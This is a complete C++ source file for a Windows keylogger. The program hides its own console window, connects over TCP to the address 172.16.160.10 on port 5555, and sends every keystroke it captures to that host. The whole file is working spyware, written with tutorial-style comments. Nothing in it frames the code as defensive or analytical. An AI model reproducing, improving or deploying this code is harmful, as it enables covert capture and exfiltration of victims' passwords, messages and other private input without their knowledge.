#define _WINWOCK_DEPRECATED_NO_WARNINGS //we use winsock util and we do not want the compiler to complaint
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h> 

int main()
{
ShowWindow(GetConsoleWindow(), SW_HIDE); //hide htis progrma
char KEY; //var for isngle key
WSADATA WSAData; //decalration of structure
SOCKET server; //var for storing the conn
SOCKADDR_IN addr;

WSAStartup(MAKEWORD(2, 0), &WSAData); //init winsock lib to open netwrok
server = socket(AF_INET, SOCK_STREAM, 0); //set up TCP socket
addr.sin_addr.s_addr = inet_addr("172.16.160.10");
addr.sin_family = AF_INET;
addr.sin_port = htons(5555);
connect(server, (SOCKADDR *)&addr, sizeof(addr));

//next we write the code taht will be responsible for collecting the pressed keys

while (true)
{
Sleep(10); //sleep for 10 milisec
for (int KEY = 0x8; KEY < 0xFF; KEY++) //check if this is a printable key
{
if (GetAsyncKeyState(KEY) == -32767) 
{ //if a key was pressed
char buffer[2]; //declare var that can hold the pressed key
buffer[0] = KEY; //insert the key into the array
send(server, buffer, sizeof(buffer), 0);
}
}}
closesocket(server); //close socket
WSACleanup(); //clean up winsock

}
